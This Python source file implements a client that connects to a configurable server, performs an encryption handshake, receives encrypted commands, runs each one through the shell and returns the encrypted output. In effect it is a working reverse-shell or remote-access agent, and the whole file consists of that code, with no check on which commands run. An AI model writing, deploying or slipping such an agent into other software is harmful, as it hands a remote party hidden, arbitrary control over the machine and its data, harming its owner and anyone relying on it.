import socket
import argparse
from client.crypto import Security
import subprocess
from concurrent.futures import ThreadPoolExecutor
from network.tcp import Tcp
class Client:
    def __init__(self, server_ip, server_port):
        # public members
        self.server_ip = server_ip
        self.server_port = server_port
        
        # private members
        self.__security = Security()
        self.__client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__client_socket.connect((self.server_ip, self.server_port))
        try:
            self.__security.handshake(self.__client_socket)
        except Exception as e:
            print(f"Failed handshake with: {e}")
        self.__pool = ThreadPoolExecutor(max_workers=3)
    
    def execute(self, command):
        print(f"Received command: {command}")
        result = subprocess.run(command, shell=True, capture_output=True)
        output = result.stdout.decode() + (result.stderr.decode() if result.stderr else "")
        print(output)
        ciphertext = self.__security.encrypt(output)
        try:
            Tcp.send(self.__client_socket, ciphertext)
        except Exception as e:
            print(f"Failed to send data: {e}")
            
    def start(self):
        while True:
            try:
                data = Tcp.recive(self.__client_socket)
                if not data:
                    break
                elif data == b"\x00":
                    continue
                else:
                    command = self.__security.decrypt(data)
                    self.__pool.submit(self.execute, command)
            except Exception as e:
                print(f"Error occurred: {e}")
                break
                
    def shutdown(self):
        self.__client_socket.close()
        self.__pool.shutdown(wait=False)
            
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simple client for connecting to the server")
    parser.add_argument("--ip", type=str, default="127.0.0.1", help="IP address of the server to connect to")
    parser.add_argument("--port", type=int, default=12345, help="Port number of the server to connect to")
    args = parser.parse_args()
    client = Client(args.ip, args.port)
    client.start()
    client.shutdown()